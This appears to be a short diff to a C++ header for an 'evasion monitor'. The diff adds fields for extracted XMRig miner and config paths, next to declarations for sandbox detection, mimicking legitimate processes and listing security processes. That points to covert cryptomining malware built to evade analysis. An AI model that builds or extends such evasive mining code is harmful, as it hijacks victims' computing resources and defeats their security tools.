@@ -25,6 +25,10 @@ private:
     bool checkSandboxEnvironment();
     void mimicLegitimateProcess();
     std::vector<std::string> getSecurityProcessList();
+    
+    // مسارات الملفات المستخرجة
+    std::string extractedXMRigPath;
+    std::string extractedConfigPath;
 };
 
 #endif // EVASION_MONITOR_H
